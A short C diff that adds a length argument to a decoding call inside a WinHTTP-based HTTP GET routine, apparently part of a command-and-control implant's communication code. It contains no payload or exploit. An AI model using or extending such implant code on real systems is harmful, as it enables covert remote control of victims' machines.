@@ -300,7 +300,7 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 	}
 
 	WinHttpCloseHandle(request);
-	read = recover(setting_ptr(SETTING_C2_RECOVER), buffer, read, max);
+	read = recover(setting_ptr(SETTING_C2_RECOVER), (int)setting_length(SETTING_C2_RECOVER), buffer, read, max);
 	return (int)read;
 }
 
